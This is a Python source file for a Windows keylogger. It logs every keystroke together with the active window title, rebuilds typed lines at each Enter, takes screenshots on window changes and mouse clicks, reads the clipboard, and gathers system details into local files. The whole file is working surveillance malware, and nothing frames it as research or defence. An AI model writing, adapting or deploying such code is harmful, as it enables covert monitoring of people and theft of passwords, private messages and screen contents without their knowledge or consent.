from win32gui import GetWindowText, GetForegroundWindow
from pynput.keyboard import Listener as KeyListener
from pynput.mouse import Listener as MouseListener
from subprocess import call
import time, datetime
import platform
from PIL import ImageGrab
import win32clipboard
from pynput import mouse

class Keylogger:
    log_dir = r"./data/"
    last_key = ""
    stringKey = []
    
    def __init__(self):
        self.appName = GetWindowText(GetForegroundWindow())

    def get_os_info(self):
        return platform.platform(), platform.uname(), platform.system(), platform.release(), platform.version(), platform.machine(), platform.processor(), platform.architecture(), platform.node(), platform.platform(), platform.python_build(), platform.python_compiler(), platform.python_branch(), platform.python_implementation(), platform.python_revision(), platform.python_version(), platform.python_version_tuple()

    def get_app_name(self):
        return self.appName
    
    def get_active_window(self):
        return GetWindowText(GetForegroundWindow())
    
    def get_date_time(self):
        now = datetime.datetime.now()
        return now.strftime("%Y-%m-%d %H:%M:%S:%f")
    
    def capture_screen(self):
        snapshot = ImageGrab.grab()
        file_name = self.log_dir + "Screenshot" + self.get_date_time() + self.get_app_name() + ".jpg"
        file_name = file_name.replace(":", "-")
        snapshot.save(file_name)

    def get_clipboard(self):
        win32clipboard.OpenClipboard()
        data = win32clipboard.GetClipboardData()
        win32clipboard.CloseClipboard()
        return data
            
    def writeLog(self, dir, time, appName, key):
        with open(dir + "keyLog.txt", "a", encoding="utf-8") as f:
            f.write(time + ": " + appName + " - " + key + "\n")
            self.stringKey.append(key)
            if(key == "Key.enter"):
                self.stringKey = ' '.join(self.stringKey)
                f.write("==> " + time + ": " + appName + " - " + self.stringKey + "\n")
                self.stringKey = []
            f.close()
    
    def on_press(self, key):   
        print(key)  
        print(self.get_app_name() + " - " + str(key))
        if (self.get_active_window() != self.appName or str(key) == "Key.enter"): 
            self.capture_screen()
            self.appName = self.get_active_window()

        #Check clipboard change
        if (str(key) >= "\x03"):
            self.writeLog(self.log_dir, self.get_date_time(), self.get_active_window(), "Clipboard: " + self.get_clipboard())
        
        self.writeLog(self.log_dir, self.get_date_time(), self.get_active_window(), str(key))

    def on_click(self, x, y, button, pressed):
        if not pressed and button != mouse.Button.middle:
            print("Right Click Detected (released)")
            self.capture_screen()

        print('{0} at {1}'.format('Pressed' if pressed else 'Released', (x, y)))
    
    def run(self):
        # Setup the listener threads
        keyboard_listener = KeyListener(on_press=self.on_press)
        mouse_listener = MouseListener(on_click=self.on_click)

        # Start the threads and join them so the script doesn't end early
        keyboard_listener.start()
        mouse_listener.start()
        keyboard_listener.join()
        mouse_listener.join()